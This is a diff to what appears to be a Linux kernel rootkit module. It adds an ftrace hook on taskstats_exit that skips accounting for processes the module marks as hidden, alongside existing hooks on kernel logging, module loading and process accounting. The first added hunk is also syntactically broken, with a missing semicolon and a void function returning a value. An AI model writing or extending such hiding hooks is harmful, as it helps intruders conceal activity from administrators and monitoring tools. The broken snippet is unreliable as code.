@@ -1401,6 +1401,12 @@ static asmlinkage  void ftrace_acct_process(struct pt_regs *regs)
 {
 	return real_acct_process(regs)
 }
+
+static asmlinkage  void (*real_taskstats_exit)(struct pt_regs *regs) = NULL;
+static asmlinkage  void ftrace_taskstats_exit(struct pt_regs *regs)
+{
+	return real_taskstats_exit(regs)
+}
 #else
 
 static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
@@ -1884,6 +1890,14 @@ static asmlinkage  void ftrace_acct_process(void)
 		return;
 	return real_acct_process();
 }
+
+static asmlinkage  void (*real_taskstats_exit)(struct task_struct *tsk, int group_dead) = NULL;
+static asmlinkage  void ftrace_taskstats_exit(struct task_struct *tsk, int group_dead)
+{
+	if (is_hidden_proc(tsk))
+		return;
+	return real_taskstats_exit(tsk, group_dead);
+}
 #endif
 
 /* Check syscalls for hidden proc
@@ -2019,6 +2033,7 @@ static struct ftrace_hook hooks[] = {
         HOOK("msg_print_ext_body", ftrace_msg_print_ext_body, &real_msg_print_ext_body),
         HOOK("layout_and_allocate", ftrace_layout_and_allocate, &real_layout_and_allocate),
         HOOK("acct_process", ftrace_acct_process, &real_acct_process),
+        HOOK("taskstats_exit", ftrace_taskstats_exit, &real_taskstats_exit),
 };
 
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
